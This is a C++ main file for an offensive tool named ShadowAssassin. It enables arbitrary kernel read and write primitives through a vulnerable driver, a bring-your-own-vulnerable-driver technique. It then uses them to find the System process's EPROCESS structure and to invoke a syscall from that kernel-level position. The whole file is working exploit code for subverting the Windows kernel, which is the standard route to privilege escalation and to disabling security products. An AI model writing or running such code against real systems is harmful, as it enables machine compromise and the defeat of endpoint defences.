#include "shadowassassin.h"
#include "ReadWriteLibrary/VulnerableDriverReadWrite.h"
#include "offsets.h"


static bool IsValidKernelAddress(UINT64 addr) {
    return addr >= 0xFFFF800000000000ULL && addr <= 0xFFFFFFFFFFFFFFF0ULL;
}

static UINT64 Read64(VulnerableDriver& drv, UINT64 addr) {
    if (!IsValidKernelAddress(addr)) {
        DbgLog("[Read64] SKIP: non-canonical addr=0x%llX\n", addr);
        return 0;
    }
    UINT64 val = 0;
    drv.Read(&val, addr, sizeof(UINT64));
    return val;
}


int main() {
    DbgLog("=== ShadowAssassin init ===\n");

    VulnerableDriver driver;
    ShadowAssassin assassin;

    driver.EnablePrimitives();

    if (!driver.primitivesEnabled) {
        DbgLog("[main] FAIL: primitives not enabled — driver may not be loaded\n");
        return 1;
    }
    DbgLog("[main] Primitives enabled\n");

    assassin.SetReadPrimitive([&](UINT64* dst, UINT64 addr, UINT64 size) { driver.Read(dst, addr, size); });
    assassin.SetWritePrimitive([&](UINT64 addr, UINT64 data) { driver.Write(addr, data); });

    UINT64 eprocess = assassin.Get_System_EPROCESS();

    if (!eprocess) {
        DbgLog("[main] FAIL: GetEPROCESS returned 0\n");
        driver.CleanUp();
        return 1;
    }

    assassin.SetEPROCESS(eprocess);
    assassin.Initialize();


	assassin.CallSyscall("NtQuerySystemInformation", { 0, 0, 0, 0 });




/*    Sleep(100);
    __debugbreak();*/

    driver.CleanUp();
    DbgLog("[main] Done\n");
    return 0;
}
